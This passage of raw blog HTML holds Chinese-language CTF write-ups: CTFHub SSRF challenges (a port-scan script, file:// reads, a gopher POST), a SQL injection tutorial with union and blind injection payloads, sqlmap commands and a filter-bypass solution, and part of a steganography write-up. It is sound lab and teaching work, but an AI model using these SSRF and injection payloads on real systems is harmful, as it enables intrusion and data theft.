  <span class="comment">#导入repuests库，用于发送http请求</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge-278b9ef55b2c3682.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000&#x27;</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8000</span>, <span class="number">9001</span>):      <span class="comment">#用于遍历窗口8000-9000</span></span><br><span class="line">    url_1 = <span class="string">f&#x27;http://challenge-278b9ef55b2c3682.sandbox.ctfhub.com:10800/?url=127.0.0.1:<span class="subst">&#123;index&#125;</span>&#x27;</span></span><br><span class="line">    res = requests.get(url_1)    <span class="comment">#发送get请求</span></span><br><span class="line">    <span class="built_in">print</span>(index, res.text)</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjJkMTQ5YWU3MzRmZDE3NzU4OGYwNzkxNmIyNjMxZmNfaUpkcko1T1AxSmtCNHdYclJKb0VkTE5RbE90TTJWUmVfVG9rZW46TkpIQ2Jodmkzb0hEQWN4alZtbWNRSUl6bndoXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>当运行到对应端口，出现flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;2eca6e24d819312c473a34d1&#125;</span><br></pre></td></tr></table></figure><h2 id="CTFHUB-POST请求"><a href="#CTFHUB-POST请求" class="headerlink" title="CTFHUB-POST请求"></a>CTFHUB-POST请求</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTcxYWM2MDUzMzFjODI4YzA5NTNkY2U4YTRhMDNhYjdfbGowQjBBdVRXNzZadlQ4MkZRajhoOFZSQm9STkJNeHVfVG9rZW46WkZVV2J3U0Fub3RJdjV4NEd0aGN4eEVqbnVlXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>看提示</p><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p><p>我们先试着通过GET访问一下flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-42b6c44fe6645614.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTJhMDhhMDc5OGFjMWNiNDdiYTk5NmMzNjhhMjI1ZDdfZjdHenpuU1R4TzgyYXRVZ1pQTGtSSlNPWjcwWDgzak5fVG9rZW46Tk9Pa2JkRWswb09LWUd4bEVJdmNJREZSblVoXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>查看一下源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=11204e9be51c95a55882a55de3d9c4aa--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那我们就在输入框中输入key的值</p><p>显示一下页面</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzA4MDdkOTE4NzQwNmM2NTAwOTRjMTU0ZjAzZDBkNjhfdWFBZTB0ZGcwVUwwNjhKT0tjTFFpN0M3UlA3Y0dvNUpfVG9rZW46VFBha2JiTGVPb1h3Rnd4enRFOWM3N01zbllMXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>意思是我们只被允许从127.0.0.1中访问</p><p>尝试通过file协议读取index.php和flag.php的源码，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/index.php</span><br><span class="line">?url=file:///var/www/html/flag.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset($_REQUEST[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    echo <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">&quot;key&quot;</span>]) &amp;&amp; $_POST[<span class="string">&quot;key&quot;</span>] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>我们使用Gopher 协议向服务器发送POST包，下面是构造的请求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">80</span></span><br><span class="line">Content-Length: <span class="number">36</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">key=<span class="number">11204e9</span>be51c95a55882a55de3d9c4aa</span><br></pre></td></tr></table></figure><p>下面是利用赛博厨子对url编码进行编码</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OWIxZjA0YjFhNTFhM2ZkMTJlODI5M2YyOGU3NWVhMGRfVWFIdHN3RWZlOGFOS0VZTW9xWFF0aHBibjhwaGVRbk5fVG9rZW46RWFkeWJHcDJib3ZXNTJ4aVpHb2M5ZTF4bmUwXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YWRmMDM2MzRkZjZkYjRhZTkxYzEzMDg0MTUyNGM4NzNfYVA5OTZlSnFkRXhWSnZiaFVVWXhuUHB5UVc5b21VdjJfVG9rZW46SXV0YWJKdnVVbzltSk94VGJ6dmNJVW51bnpiXzE3NDU4NDIzMDc6MTc0NTg0NTkwN19WNA" alt="img"></p><p>发送post请求，得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;697c699c9719bbf6a98fa2d9&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week2-web</title>
      <link href="/2025/04/28/week2-web-SQL/"/>
      <url>/2025/04/28/week2-web-SQL/</url>
      
        <content type="html"><![CDATA[<h1 id="week—web-SQL"><a href="#week—web-SQL" class="headerlink" title="week—web-SQL"></a>week—web-SQL</h1><p>一般情况下，通过post方式传入一个参数id来查询数据库的内容。</p><h2 id="判断sql语句闭合方式"><a href="#判断sql语句闭合方式" class="headerlink" title="判断sql语句闭合方式"></a>判断sql语句闭合方式</h2><p>当在id的值后面加上<code>&#39;</code>时，界面无回显，就可以判断后面的sql语句应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xxxx from xxxx where id = &#x27;input_id&#x27; [xxxx]</span><br></pre></td></tr></table></figure><p>意思表示：“从名为‘xxxx’的表中选择列‘xxxx’的所有数据，但只包括那些其’id’列与给定的’input_id’相匹配的行。”</p><p><code>xxxx</code>是占位符，第一个<code>xxxx</code>会被实际的列名替换；第二个<code>xxxx</code>会被表名替换。<code>input_id</code>被替换成想要查找的具体id值。</p><h3 id="常见闭合模式判断表"><a href="#常见闭合模式判断表" class="headerlink" title="常见闭合模式判断表"></a>常见闭合模式判断表</h3><table><thead><tr><th>页面反应</th><th>可能闭合方式</th></tr></thead><tbody><tr><td>1’ 报错</td><td>数字型或双引号</td></tr><tr><td>1’ 正常</td><td>单引号闭合</td></tr><tr><td>1’– 正常</td><td>单引号闭合</td></tr><tr><td>1’) 报错</td><td>非括号闭合</td></tr><tr><td>1’)– 正常</td><td>单引号+括号闭合</td></tr><tr><td>1’ 和 1’ AND ‘1’&#x3D;’1 都正常</td><td>单引号闭合</td></tr></tbody></table><h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><ol><li><h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2></li></ol><p>寻找可能存在漏洞的参数</p><p>在参数值后添加<code>&#39;</code>,<code>&quot;</code>,<code>()</code>等payload来判断注入点，查看返回结果，如果报错，则可能这个参数存在注入漏洞。</p><ol><li><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2></li></ol><h3 id="数字型注入的sql语句"><a href="#数字型注入的sql语句" class="headerlink" title="数字型注入的sql语句"></a>数字型注入的sql语句</h3><p>一般形式：<code>select * from 【表名】 where id = 1</code></p><h4 id="如何测试："><a href="#如何测试：" class="headerlink" title="如何测试："></a>如何测试：</h4><ul><li>加单引号<code>&#39;</code>,这种情况会报错；</li><li>加<code>and 1=1</code>，语句正常执行，无回显；</li><li>加<code>and 1=2</code>，正常执行，但有回显；</li></ul><p>以上三点 满足，则此处存在数字型注入</p><h3 id="字符型注入的sql语句"><a href="#字符型注入的sql语句" class="headerlink" title="字符型注入的sql语句"></a>字符型注入的sql语句</h3><p>一般形式：<code>select * where name = &#39;用户名的具体值&#39;</code></p><ul><li>加单引号<code>&#39;select * from 【表名】 where name =&#39;用户名具体值&#39; and 1=1 #&#39;</code></li></ul><p>回显正常则判断此处为字符型注入。</p><ol><li><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by x(x为数字)</span><br></pre></td></tr></table></figure><p>从1开始增加，知道返回错误信息，就找到字段数（x-1）</p><ol><li><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3></li></ol><p>使用union select语句来联合查询其他表的数据。例如，假设已经确定字段数为 3，输入’ union select 1,2,3–，观察页面返回结果，确定哪些字段可以显示数据。</p><p>通过替换union select语句中的数字为数据库函数，如database()、version()等，获取数据库的名称</p><p>另：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,database()</span><br></pre></td></tr></table></figure><p>从而得到数据库名</p><ol><li><h3 id="爆表名和列名"><a href="#爆表名和列名" class="headerlink" title="爆表名和列名"></a>爆表名和列名</h3></li></ol><p>使用<code>information_schema</code>数据库中的<code>tables</code>表和<code>columns</code>表来获取目标数据库中的表名和列名。例如，输入<code>&#39; union select 1,table_name,3 from information_schema.tables where table_schema=database()--</code>，可以获取当前数据库中的所有表名；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1, column_name, 3 from information_schema.columns where table_schema =database() AND table_name = &#x27;目标表名&#x27; --+</span><br></pre></td></tr></table></figure><p>table_name是目标表名</p><p>我们假设上面的数据库名称为sqli</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><ol><li><h3 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h3></li></ol><p>假设我们需要爆的字段是flag，则有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag</span><br></pre></td></tr></table></figure><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>页面没有回显字段，不显示查询到的结果，只是返回是否查询成功（返回查询语句的布尔值），这种情况一般比较复杂，需要不断尝试</p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><ol><li>爆库名长度</li><li>根据库名长度爆库名</li><li>对当前库爆表数量</li><li>根据库名和表数量爆表名长度</li><li>根据表名长度爆表名</li><li>对表爆列数量</li><li>根据表名和列数量爆列名长度</li><li>根据列名长度爆列名</li><li>根据列名爆数据值</li></ol><p>这种情况也可以直接利用脚本来解决</p><p>没有看到比较典型的，还是做题的时候现找吧</p><p>时间运行可能会比较久</p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>当注入条件为真时，反应时间会比较长，利用这个点，找到那个真的注入条件，但显然，这个做法会很慢，耽误很长时间。</p><p>在比较简单的题目中，我们倒是可以利用这个点来进行操作</p><h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><ol><li>确定注入点</li><li>构造延时查询</li><li>观察响应时间</li><li>逐步猜解信息</li></ol><p>另外可以利用sqlmap进行解题，这个方法比较简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;URL&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;URL&quot;</span> -D sqli --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;URL&quot;</span> -D sqli -T flag --columns --dump</span><br></pre></td></tr></table></figure><p>另外利用python脚本</p><p>依旧是根据题目来写</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2NmN2RlNmNjM2JhODc1OTJhOWYwNmY5NGEzZWZhNjdfQ1BiWldaNU5wR09VNlZwV3g2ZHJNNUxmWFB0dFAxa3dfVG9rZW46V2pqWmJrTXpqb0dhMXV4cE5reWNPNnNHbmJjXzE3NDU4NDE4OTY6MTc0NTg0NTQ5Nl9WNA" alt="img"></p><p>我们先进行测试</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTM5M2FkNjlhMzk5ZTVjZWRmOTYyNDQ0M2UxNjcxNDZfMVo1OGVOSlZ0TVFXdlIxVDRKcFNMUmE1OEEzZktaNm5fVG9rZW46QnF3amJHb3l1b1FNdDZ4cTV3Y2NxOWxSbkNiXzE3NDU4NDE4OTY6MTc0NTg0NTQ5Nl9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQ4ZTNlZGQ5MzE2MTE1Njg1NzcxZDkzZDU1ZGNmNmVfaE9kQVRNT2Y2QXpQcGhqaVR4dVdtZ1gxU3JlcHBKMFNfVG9rZW46UUpyWWJxWkJNb2I4cDN4Sk1wOWNqZk9mbm5lXzE3NDU4NDE4OTY6MTc0NTg0NTQ5Nl9WNA" alt="img"></p><p>在后面我们发现是有空格过滤和等号过滤的，我们用&#x2F;**&#x2F; 代替空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23</span><br><span class="line">LTLT_flag,users</span><br></pre></td></tr></table></figure><p>获得表名</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTQwNmY0OTJhNzAzZDIxYThkYWZmNDIyNmVmMjQ3NGFfb1pIa1dwSkFQN3I5TG1rQUR6Y3l3ZjdCOHdMUGJlM2pfVG9rZW46S1VoNGIzUzhhb0xGOTN4NEtUZGM3em9UbjZjXzE3NDU4NDE4OTY6MTc0NTg0NTQ5Nl9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23</span><br><span class="line">id,flag,id,username</span><br></pre></td></tr></table></figure><p>得到列名</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjIwZTA5YjkyYzUwZjMwZjc3OWE0ZDliZmNiYzhmY2FfZDNkWGVuRURTUTJXcHEwNGN5c2JXcEF3ZE9SejV0NkZfVG9rZW46VVpzTWI3d0JMb0xLMlh4ZkNlcmNYRTNCbmZlXzE3NDU4NDE4OTY6MTc0NTg0NTQ5Nl9WNA" alt="img"></p><p>最后获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_flag%23    //%23是#的URL编码，注释掉原始查询的剩余部分</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2Y2YjY5ODExNjQ4YWIzMDNmMjFiNmFkMzg2NjY0MTJfekM3Zm01Wmg0TjZCem5NWndsWllCMERIVXdScmhQeUlfVG9rZW46UHh6aGJzYWxJb2VGczZ4cmp5YWNIRFd0blRlXzE3NDU4NDE4OTY6MTc0NTg0NTQ5Nl9WNA" alt="img"></p><p>获得flag</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week1-web</title>
      <link href="/2025/04/28/week1-web-%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2025/04/28/week1-web-%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="校赛wp"><a href="#校赛wp" class="headerlink" title="校赛wp"></a>校赛wp</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="baby-misc"><a href="#baby-misc" class="headerlink" title="baby_misc"></a>baby_misc</h2><p>下载压缩包打开后，其中还有一个压缩文件和一个mp3格式文件，其中的压缩文件是加密的，如下：</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTJhMTk4ODQwZjY5MDA2ZTc3MGNmYTI2NDVlYWFmNjRfMWNRSE42MmZTdzBqbHEzT2pSaHk2TWlSaEhjWFljem1fVG9rZW46TThCVmJzWnR1b2xyTjF4ZmRQZmNybE82blJoXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMxNjM0NzcxODc3NzdjYjczYmNiYzFkYzQxMDU3MzhfS0VleGl1WVFpTGF2MG9oaGxJbEd0N09hdm01WU82SGRfVG9rZW46S2QyR2JZRTB0b2Z5MjJ4anJFOWNIalk2bmtmXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>所以我们要找到这个文件的密码，由题目中的提示，如下：</p><p>可知mp3音频的密码是1111，解决音频后可能得到压缩包的密码</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY4ZDZkN2JmMDUyMWVlZDkxNmU1MjJiNjJmODNlZWJfMldjS0U4Q3p6bjFqTmlTSzJadklYY3M2NnBkRHhZeXNfVG9rZW46Q2FYQmJmZ1cyb2NRSE94UEROVWMwRkhmbmRjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>对于如何在MP3stego中执行解码命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode -X -P 密码 输入.mp3</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTFmOGZjOWUxODc4NWY4OGE4OWIwZDFkZDNmMGEyMTBfMlBYT2QwdXpDU0FaUDNPUllWdmJmWTdaeHpyZG1CUnRfVG9rZW46QmZuRmJiSUZxb3hEQXJ4aUF6aGNwQVN6blFjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTEwMWVmOWJlZTZmOGFiMjRkOGFkZTAwZjYyMGE1YWFfODgzWjIzSDBqSW1GTzRnRzFFcnlpanc0aHZVMXdaeldfVG9rZW46UlVHaWJDdVlZbzdkYnF4VlF1SmNsUjVHbjhmXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>打开后发现是压缩包，将其复制进入010，并保存</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTllZTRjNmNmYTgxNTMyODM1N2JkY2EwNmM3YzRkOGZfRUxYR09CZ2xqRnlDejhzbGJBaGdTNVRmRTFqb0dOWHFfVG9rZW46UDEzMGIzWlVab2JHS054ZGxpTWNyVDJ0bkdaXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTUyODk4YjhmNzZlZmU3ZDAwMTI3ZmFmYTg1ODMzMjRfSlRUZzFDWGFZRmZuQkowdXdSOXJnMFhmT0VEeTV6WFRfVG9rZW46T3hPYWJhaVdZb3V5alR4RWx4aWNKakVCbk5jXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>保存成压缩包形式打开后</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcyY2IwOTZhMTU1Y2RhMWI4YWI0ZmEwNDRlZjA5YzNfWjVIQjlPWmJxc0JwTUhEYVh0ZFY0N1NVSjdTZHNMYkVfVG9rZW46WFNXNWJ0ckFBb0dUb1F4NzFvQWMxbndWbktoXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>发现每一个文本中都有循环冗余，原始大小都为6字节</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI3MzQ1ZGVhZDA4YTcyODJlZGU2MTgxNWQ4ZmM5ZTBfVHF5eFpVemp3VkpYY0ZRZVRXRWNEcWE4SVJMS2ZZY2FfVG9rZW46RjUzbGIyclpGb3VhOGV4Nlc1QmNPZVE5blpkXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>依次暴破</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OWYyNDAxZWFjMzVlNThiODQxNDY3Zjc3OTljZGY2M2VfM1M0dkxqY2FoZHZYa2RSdmZjcVlnRWtHRlN5RjVLTzhfVG9rZW46Tm9ocmJtVGY3b2FmMjZ4WWJuVGNDYzlPblllXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFiMzgwOGJkZTgxZDAzZjJhZDAwYzE4NmFkOTcxM2NfcXR4VWF4YVl5ZjZzSUNaanNRUEdhOGxzbTFvdVZ3bXhfVG9rZW46WkE5U2J5T0tGb2k2cjd4OXA1ZGNYdkdMbmNLXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGQ5ZjMzZDg3MmVmMmVkYmZkMmU0ZGEwMjY3ZTY0MTRfYWtXQ1Awdjk1STV3a1pnaXRES1B1WTVDVWxsWmJSQjJfVG9rZW46R0kxcWJEZGtjb1kxeXd4cEk1UGNNcks2bkE0XzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NmU1YTNjYzMxZWNkOWFhMjJjMTliODAwNWEzOGViOWJfU2pFUFBqcWhBak5ObmUxVFhyUGUxeUZUVm8zRkIxUGxfVG9rZW46UEhuV2JUTHZDb2l1VFZ4b1NnT2N4blMybmdjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>找到了压缩文件密码，如下：</p><p><strong><code>oh_you_are_9ood_at_CRC32</code></strong></p><p>解压完成后打开，内容如下：</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjVhZDVhNjNiZWVjZTRiYzQ2ZThkNjMzZmQ0YzIwMDdfSTZEQ0pLZjdlOXM2SE42UmxLQmdOQTJ3MlNBZlN2aXlfVG9rZW46SktXOGJSbG5Kb0ltMUd4bnVqZ2NjZlZQbjRiXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>看他的文件头，就可以发现这是一个gif动图，将其复制进010中并保存</p><p>重新打开后就可以看到转瞬即逝的flag，利用stegsolve分析</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=N2NlMDdhYThhNGQxMWM5ZDI2Mjc3MzA0YTQ0NzcxNWFfbzVlZ1c3Q2Vwa01NZkZoODNxdTFJU1FFdnJ3cUU1UFBfVG9rZW46R3dNa2J5NE9rb3h3ZzJ4ZGJFM2NZaGUzbkpnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>选择Frame Browser对动图进行逐帧分析</p><p>得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MWM0MjBkNzc4MjAzMWM4MDc5NDk1OWYyMjljYjgyYWRfdEhnQmhPcWxQU29mSjJPeE1qSzRYcE5Gc1lRT3JqY0pfVG9rZW46VzlBVmJIZFlVbzBCeU14TU45ZmNzSk5IblRjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;L1st3n_bE4ut1ful_5ong&#125;</span><br></pre></td></tr></table></figure><h2 id="Ez-QR"><a href="#Ez-QR" class="headerlink" 